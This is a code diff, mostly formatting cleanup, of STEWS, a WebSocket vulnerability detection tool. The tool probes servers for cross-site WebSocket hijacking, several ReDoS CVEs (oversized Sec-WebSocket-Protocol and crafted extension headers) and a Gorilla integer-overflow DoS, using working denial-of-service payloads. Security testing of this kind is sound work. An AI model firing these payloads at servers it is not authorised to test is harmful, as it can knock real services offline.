@@ -8,10 +8,11 @@ import requests
 from cprint import *
 from urllib.parse import urlparse
 
-debug=False
-cntn_timeout=10
-vuln_urls=[]
-vuln_reasons=[]
+debug = False
+cntn_timeout = 10
+vuln_urls = []
+vuln_reasons = []
+
 
 def parse_args():
     parser = argparse.ArgumentParser(description="Security Testing and Enumeration of WebSockets (STEWS) Vulnerability Detection Tool")
@@ -39,11 +40,13 @@ def parse_args():
                         help="Test CVE-2020-27813 - Gorilla DoS Integer Overflow")
     return parser.parse_args()
 
+
 def ws_reconnect(ws, wsurl, opts, options):
     try:
         ws.connect(wsurl, skip_utf8_validation=True, timeout=cntn_timeout, **options)
     except Exception as e:
         print("Exception while trying to connect for mask tests: ", e)
+
 
 def run_tests(arguments):
     # Create empty vars
@@ -81,6 +84,7 @@ def run_tests(arguments):
     if args.gorilla_regex_dos:
         gorilla_regex_dos_test(ws, wsurl, arguments, opts, options)
 
+
 def pretty_print_GET(req):
     """
     At this point it is completely built and ready
@@ -96,8 +100,8 @@ def pretty_print_GET(req):
         '\r\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items())
     ))
 
+
 def CSWSH_try_connect(ws, wsurl, opts, options):
-    msg="'"
     if "origin" in options:
         headers = {'Upgrade': 'websocket', 'Origin': options["origin"], 'Sec-WebSocket-Key': 'U2NqiNJpRpRGdvagcfySUA==', 'Connection': 'Upgrade', 'Sec-WebSocket-Version': '13'}
     else:
@@ -111,7 +115,7 @@ def CSWSH_try_connect(ws, wsurl, opts, options):
     prepared = req.prepare()
     if debug:
         pretty_print_GET(prepared)
-    try: # Try connecting to endpoint
+    try:  # Try connecting to endpoint
         resp = requests.get(httpurl,headers=headers,timeout=cntn_timeout)
         return_value = 0
         if debug:
@@ -123,6 +127,7 @@ def CSWSH_try_connect(ws, wsurl, opts, options):
         if debug:
             print("Exception while trying to connect for CSWSH tests: ", e)
         return 0
+
 
 def CSWSH_test(ws, wsurl, arguments, opts, options):
     # First vanilla connection attempt
@@ -183,8 +188,8 @@ def CSWSH_test(ws, wsurl, arguments, opts, options):
             vuln_reasons.append(reason)
             vuln_urls.append(wsurl)
 
+
 def protocol_try_connect(ws, proto_value, wsurl, opts, options):
-    msg="'"
     headers = {'Upgrade': 'websocket', 'Origin': options["origin"], 'Sec-WebSocket-Key': 'U2NqiNJpRpRGdvagcfySUA==', 'Sec-WebSocket-Protocol': proto_value, 'Connection': 'Upgrade', 'Sec-WebSocket-Version': '13'}
     httpurl = ""
     # Replace the WebSocket URL with a HTTP URL
@@ -196,10 +201,9 @@ def protocol_try_connect(ws, proto_value, wsurl, opts, options):
     prepared = req.prepare()
     if debug:
         pretty_print_GET(prepared)
-    s = requests.Session()
     # websocket.enableTrace(True)
     ws = websocket.WebSocket(sslopt=opts)
-    try: # Try connecting to endpoint
+    try:  # Try connecting to endpoint
         ws.connect(wsurl, header={'Sec-WebSocket-Protocol': proto_value}, timeout=cntn_timeout)
         if debug:
             print("Response status code: ", resp.status_code)
@@ -208,22 +212,23 @@ def protocol_try_connect(ws, proto_value, wsurl, opts, options):
         if ws.getstatus() == 101:
             print("Exception while trying to connect for ws redos tests: ", e)
 
+
 def ws_redos_2021(ws, wsurl, arguments, opts, options):
     # CVE-2021-32640 test
-    regex_time_delta = 0.4 # minimum time difference (in seconds) between 2nd and 3rd request that will trigger vuln alert
+    regex_time_delta = 0.4  # minimum time difference (in seconds) between 2nd and 3rd request that will trigger vuln alert
     times = [0, 0, 0]
     times[0] = time.time()
     spaces = 30000
-    protocol_payload = "b" + " "*spaces + "x"
+    protocol_payload = "b" + " " * spaces + "x"
     print("Sending payload 1")
     protocol_try_connect(ws, protocol_payload, wsurl, opts, options)
     times[1] = time.time()
     spaces = 66000
-    protocol_payload = "b" + " "*spaces + "x"
+    protocol_payload = "b" + " " * spaces + "x"
     print("Sending payload 2")
     protocol_try_connect(ws, protocol_payload, wsurl, opts, options)
     times[2] = time.time()
-    if times[1]-times[0] < (times[2] - times[1] - regex_time_delta):
+    if times[1] - times[0] < (times[2] - times[1] - regex_time_delta):
         cprint.err(">>>VULNERABILITY DETECTED: server likely vulnerable to RegEx DoS CVE-2021-32640")
         cprint.err(wsurl)
         reason = ">>>Identifier: Longer payload delayed server response by " + str(times[2] - times[1]) + " seconds!"
@@ -236,9 +241,8 @@ def ws_redos_2021(ws, wsurl, arguments, opts, options):
 
 
 def extension_try_connect(ws, ext, wsurl, opts, options):
-    msg="'"
     headers = {'Upgrade': 'websocket', 'Origin': options["origin"], 'Sec-WebSocket-Key': 'U2NqiNJpRpRGdvagcfySUA==', 'Connection': 'Upgrade', 'Sec-WebSocket-Version': '13', 'Sec-WebSocket-Extensions': ext}
-#    attempt_ws_connection(wsurl, headers)
+    # attempt_ws_connection(wsurl, headers)
     httpurl = ""
     # Replace the WebSocket URL with a HTTP URL
     if wsurl.find("wss://") >= 0:
@@ -250,7 +254,7 @@ def extension_try_connect(ws, ext, wsurl, opts, options):
     if debug:
         pretty_print_GET(prepared)
     s = requests.Session()
-    try: # Try connecting to endpoint
+    try:  # Try connecting to endpoint
         resp = s.send(prepared, timeout=cntn_timeout)
         if debug:
             print("Extension: ", ext)
@@ -268,11 +272,12 @@ def extension_try_connect(ws, ext, wsurl, opts, options):
         print("Exception while trying to connect for faye redos tests: ", e)
         return 0
 
+
 def regex_dos_test(ws, wsurl, arguments, opts, options):
     # CVE-2020-7662 & CVE-2020-7663 test
-    regex_time_delta = 0.4 # minimum time difference (in seconds) between 2nd and 3rd request that will trigger vuln alert
+    regex_time_delta = 0.4  # minimum time difference (in seconds) between 2nd and 3rd request that will trigger vuln alert
     # Loop through all extensions and try connecting
-    extension_payloads=['a;b="\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c', 'a;b="\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c', 'a;b="\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c']
+    extension_payloads = ['a;b="\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c', 'a;b="\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c', 'a;b="\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c']
 
     start = time.time()
     extension_try_connect(ws, extension_payloads[0], wsurl, opts, options)
@@ -293,15 +298,16 @@ def regex_dos_test(ws, wsurl, arguments, opts, options):
     else:
         cprint.ok("Not vulnerable to redos CVEs")
 
+
 def zero_mask_key(_):
     return "\x00\x00\x00\x00"
 
+
 def gorilla_regex_dos_test(ws, wsurl, arguments, opts, options):
     # CVE-2020-27813 test
-    regex_time_delta = 0.4 # minimum time difference (in seconds) between 2nd and 3rd request that will trigger vuln alert
     # Loop through all extensions and try connecting
 
-    try: # Try connecting to endpoint
+    try:  # Try connecting to endpoint
         ws.set_mask_key(zero_mask_key)
         ws.connect(wsurl)
         # First, send a message with:
@@ -333,7 +339,7 @@ def gorilla_regex_dos_test(ws, wsurl, arguments, opts, options):
         # 4. mask of 0000 (\x00\x00\x00\x00)
         ws.send("BCDEF")
         print("Sent message 4")
-        #print(ws.recv())
+        # print(ws.recv())
         ws.close()
     except Exception as e:
         print(e)
@@ -347,6 +353,7 @@ def gorilla_regex_dos_test(ws, wsurl, arguments, opts, options):
         vuln_urls.append(wsurl)
     else:
         cprint.ok("Not vulnerable to redos CVEs")
+
 
 def main():
     global debug
@@ -389,6 +396,7 @@ def main():
     print("====Full list of vulnerable URLs===")
     print(vuln_urls)
     print(vuln_reasons)
+
 
 if __name__ == "__main__":
     try:
